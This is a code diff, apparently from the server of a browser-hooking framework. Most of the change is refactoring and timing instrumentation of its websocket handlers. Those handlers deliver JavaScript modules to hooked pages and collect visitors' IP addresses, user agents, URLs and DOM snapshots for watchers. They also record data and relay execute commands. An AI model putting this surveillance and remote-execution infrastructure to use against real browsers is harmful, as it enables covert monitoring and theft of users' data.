@@ -1,9 +1,12 @@
 declare var global: any
 import chalk from 'chalk'
+import * as _ from 'lodash'
+import * as perfy from 'perfy'
 const uuidv4 = require('uuid/v4')
 const minify = require('html-minifier').minify
 
 import { SocketSession } from './definitions/session'
+import { Module } from './definitions/module'
 import ModuleEval from './ModuleEval'
 import DataRecorder from './DataRecorder'
 
@@ -28,56 +31,78 @@ export default class {
     /**
      * Module loader
      */
-    module: data => {
+    module: (data) => {
+      const timing = Symbol('timing')
+      if (this.session.debug) perfy.start(timing)
       try {
         if (!data.name) return
-        let js = global.inject.modules[data.name]
-        if (this.session.debug) js = global.inject.debugModules[data.name]
-        if (js) {
+        const CachedModule: Module.Cache | null = _.find(
+          global.inject.modules,
+          { name: [data.name] }
+        )
+        if (CachedModule) {
+          let js = this.session.debug
+            ? CachedModule.debug_bundle
+            : CachedModule.production_bundle
           try {
-            try {
-              js = ModuleEval(js, {
-                Module: {
+            if (CachedModule.config.server_side) {
+              try {
+                js = ModuleEval(js, {
+                  Module: {
+                    name: data.name,
+                    token: data.token,
+                    params: data.params
+                  },
+                  injectify: {
+                    info: {
+                      ...this.client.session,
+                      project: this.session.project.name,
+                      'user-agent': this.client.client['user-agent'],
+                      ip: this.client.client.ip
+                    },
+                    devtools: {
+                      ...this.client.session.devtools
+                    },
+                    debug: this.client.session.debug
+                  }
+                })
+              } catch (e) {
+                this.send('module', {
                   name: data.name,
                   token: data.token,
-                  params: data.params
-                },
-                injectify: {
-                  info: {
-                    ...this.client.session,
-                    project: this.session.project.name,
-                    'user-agent': this.client.client['user-agent'],
-                    ip: this.client.client.ip,
-                  },
-                  devtools: {
-                    ...this.client.session.devtools
-                  },
-                  debug: this.client.session.debug,
-                }
-              })
-            } catch(e) {
-              this.send('module', {
-                name: data.name,
-                token: data.token,
-                error: {
-                  code: 'module-error',
-                  message: `Encountered an error whilst running server-side code for module "${data.name}"${this.session.debug ? `\n\n${e.stack}` : ''}`
-                }
-              })
-              return
+                  time: this.session.debug
+                    ? perfy.end(timing).milliseconds
+                    : undefined,
+                  error: {
+                    code: 'module-error',
+                    message: `Encountered an error whilst running server-side code for module "${
+                      data.name
+                    }"${this.session.debug ? `\n\n${e.stack}` : ''}`
+                  }
+                })
+                return
+              }
             }
             this.send('module', {
               name: data.name,
               token: data.token,
+              time: this.session.debug
+                ? perfy.end(timing).milliseconds
+                : undefined,
               script: js
             })
           } catch (error) {
             this.send('module', {
               name: data.name,
               token: data.token,
+              time: this.session.debug
+                ? perfy.end(timing).milliseconds
+                : undefined,
               error: {
                 code: 'server-error',
-                message: `Encountered a server-side error whilst loading module "${data.name}"`
+                message: `Encountered a server-side error whilst loading module "${
+                  data.name
+                }"`
               }
             })
           }
@@ -85,6 +110,9 @@ export default class {
           this.send('module', {
             name: data.name,
             token: data.token,
+            time: this.session.debug
+              ? perfy.end(timing).milliseconds
+              : undefined,
             error: {
               code: 'not-installed',
               message: `Module "${data.name}" not installed on server`
@@ -92,19 +120,19 @@ export default class {
           })
         }
       } catch (error) {
-        console.error(
-          chalk.redBright('[inject] ') +
-          chalk.yellowBright(error)
-        )
+        console.error(chalk.redBright('[inject] ') + chalk.yellowBright(error))
       }
     },
 
     /**
      * PageGhost
      */
-    p: data => {
+    p: (data) => {
       if (data && data instanceof Object) {
-        if (global.inject.clients[this.project.id][this.token] && global.inject.clients[this.project.id][this.token].watchers) {
+        if (
+          global.inject.clients[this.project.id][this.token] &&
+          global.inject.clients[this.project.id][this.token].watchers
+        ) {
           if (data.dom && global.config.compression) {
             try {
               let minfied = minify(data.dom, {
@@ -122,21 +150,21 @@ export default class {
                 removeStyleLinkTypeAttributes: true,
                 removeTagWhitespace: true,
                 trimCustomFragments: true,
-                useShortDoctype: true,
+                useShortDoctype: true
               })
               data.dom = minfied
-            } catch(e) {
-
-            }
+            } catch (e) {}
           }
-          global.inject.clients[this.project.id][this.token].watchers.forEach(watcher => {
-            watcher.emit('inject:pageghost', {
-              timestamp: +new Date(),
-              id: uuidv4(),
-              sender: this.client.session,
-              data: data
-            })
-          })
+          global.inject.clients[this.project.id][this.token].watchers.forEach(
+            (watcher) => {
+              watcher.emit('inject:pageghost', {
+                timestamp: +new Date(),
+                id: uuidv4(),
+                sender: this.client.session,
+                data: data
+              })
+            }
+          )
         }
       }
     },
@@ -144,7 +172,7 @@ export default class {
     /**
      * Client info logger
      */
-    i: data => {
+    i: (data) => {
       /**
        * Max string length
        */
@@ -157,11 +185,16 @@ export default class {
         if (typeof data.window === 'object') {
           let { title, url, active } = data.window
           if (typeof title === 'string') {
-            this.client.session.window.title = title.substring(0, maxStringLength)
+            this.client.session.window.title = title.substring(
+              0,
+              maxStringLength
+            )
           }
           if (typeof url === 'string') {
             this.client.session.window.url = url.substring(0, maxUrlLength)
-            this.client.session.window.favicon = `https://plus.google.com/_/favicon?domain_url=${encodeURIComponent(this.client.session.window.url)}`
+            this.client.session.window.favicon = `https://plus.google.com/_/favicon?domain_url=${encodeURIComponent(
+              this.client.session.window.url
+            )}`
           }
           if (typeof active === 'boolean') {
             this.client.session.window.active = active
@@ -169,7 +202,11 @@ export default class {
         }
         if (typeof data.devtools === 'object') {
           let { open, orientation } = data.devtools
-          if (orientation === 'vertical' || orientation === null || orientation === 'horizontal') {
+          if (
+            orientation === 'vertical' ||
+            orientation === null ||
+            orientation === 'horizontal'
+          ) {
             this.client.session.devtools.orientation = orientation
           }
           if (typeof open === 'boolean') {
@@ -180,28 +217,45 @@ export default class {
       /**
        * Emit to listening watchers
        */
-      if (global.inject.clients[this.project.id][this.token] && global.inject.clients[this.project.id][this.token].watchers) {
-        global.inject.clients[this.project.id][this.token].watchers.forEach(watcher => {
-          watcher.emit('inject:client', global.inject.clients[this.project.id][this.token])
-        })
+      if (
+        global.inject.clients[this.project.id][this.token] &&
+        global.inject.clients[this.project.id][this.token].watchers
+      ) {
+        global.inject.clients[this.project.id][this.token].watchers.forEach(
+          (watcher) => {
+            watcher.emit(
+              'inject:client',
+              global.inject.clients[this.project.id][this.token]
+            )
+          }
+        )
       }
     },
 
     /**
      * Data logger
      */
-    l: data => {
-      if (data && data.message instanceof Array && /^warn|info|error|table|return$/.test(data.type)) {
-        if (global.inject.clients[this.project.id][this.token] && global.inject.clients[this.project.id][this.token].watchers) {
-          global.inject.clients[this.project.id][this.token].watchers.forEach(watcher => {
-            watcher.emit('inject:log', {
-              type: data.type,
-              message: data.message,
-              timestamp: +new Date(),
-              id: uuidv4(),
-              sender: this.client.session
-            })
-          })
+    l: (data) => {
+      if (
+        data &&
+        data.message instanceof Array &&
+        /^warn|info|error|table|return$/.test(data.type)
+      ) {
+        if (
+          global.inject.clients[this.project.id][this.token] &&
+          global.inject.clients[this.project.id][this.token].watchers
+        ) {
+          global.inject.clients[this.project.id][this.token].watchers.forEach(
+            (watcher) => {
+              watcher.emit('inject:log', {
+                type: data.type,
+                message: data.message,
+                timestamp: +new Date(),
+                id: uuidv4(),
+                sender: this.client.session
+              })
+            }
+          )
         }
       }
     },
@@ -209,7 +263,7 @@ export default class {
     /**
      * Data recorder
      */
-    r: request => {
+    r: (request) => {
       let { table, data } = request
       if (typeof table === 'string' && typeof data !== 'undefined') {
         DataRecorder.record(this.client, this.session.project.name, table, data)
@@ -219,39 +273,46 @@ export default class {
     /**
      * Error logger
      */
-    e: data => {
+    e: (data) => {
       this.send('error', data)
-      if (global.inject.clients[this.project.id][this.token] && global.inject.clients[this.project.id][this.token].watchers) {
-        global.inject.clients[this.project.id][this.token].watchers.forEach(watcher => {
-          watcher.emit('inject:log', {
-            type: 'error',
-            message: [{
-              type: 'string',
-              message: data
-            }]
-          })
-        })
+      if (
+        global.inject.clients[this.project.id][this.token] &&
+        global.inject.clients[this.project.id][this.token].watchers
+      ) {
+        global.inject.clients[this.project.id][this.token].watchers.forEach(
+          (watcher) => {
+            watcher.emit('inject:log', {
+              type: 'error',
+              message: [
+                {
+                  type: 'string',
+                  message: data
+                }
+              ]
+            })
+          }
+        )
       }
     },
 
     /**
      * Get server ping time
      */
-    ping: pingTime => {
+    ping: (pingTime) => {
       this.send('pong', pingTime)
     },
 
     /**
      * Get server ping time
      */
-    heartbeat: data => {
+    heartbeat: (data) => {
       this.send('stay-alive')
     },
 
     /**
      * For testing execute's from the client side
      */
-    execute: data => {
+    execute: (data) => {
       this.send('execute', data)
     }
   }
